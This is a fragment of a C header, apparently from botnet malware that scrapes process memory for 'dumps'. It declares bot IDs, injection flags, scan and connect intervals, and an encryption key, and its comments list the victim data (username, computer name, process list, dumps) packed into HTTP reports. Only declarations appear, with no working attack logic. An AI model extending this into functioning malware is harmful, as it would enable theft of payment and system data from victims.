...
extern __GetLastInputInfo _GetLastInputInfo;

typedef BOOL (WINAPI *mIsWoW64Process) (HANDLE, PBOOL);
extern mIsWoW64Process IsWoW64ProcessX;
...
//global vars
extern DWORD hMutex; //FIXME: I use DWORD, instead of HANDLE, cuz it causes error when i init it.
extern HINTERNET hOpen;
extern BOOL bInjected;
extern BOOL ReportFlag, x64;
extern BYTE *pBlob, *pHttpData, Uniq[37], BotVersion[20];
extern DWORD GrowSize, ScanInterval, ConnectInterval, CurPID, ParentPID, ChildPID, CurrentModule;
extern HANDLE hHeap, hThreadRegistry, hThreadChild, hThreadScan, hCacheMapping, hInteractEvent, hConnectEvent;
extern CRITICAL_SECTION crsReportFlag, crsBlob;
extern WCHAR OldLocation[MAX_PATH], CurrentLocation[MAX_PATH], wUniq[37], IEPath[MAX_PATH];
extern char Key[5], EncodedKey[10];
extern const int fullVarSize;
extern const int runtimeVarSize;
...
static const char ClassName[] = "DetectShutdownClass";
...
//Precomputed payload sizes for HTTP data
//fullVarSize = UID + dumps + idle + username + computername + process list + arch + OS + key + encoded key + version + bot version
//runtimeVarSize = UID + dumps + idle + process list + key + encoded key + version + bot version
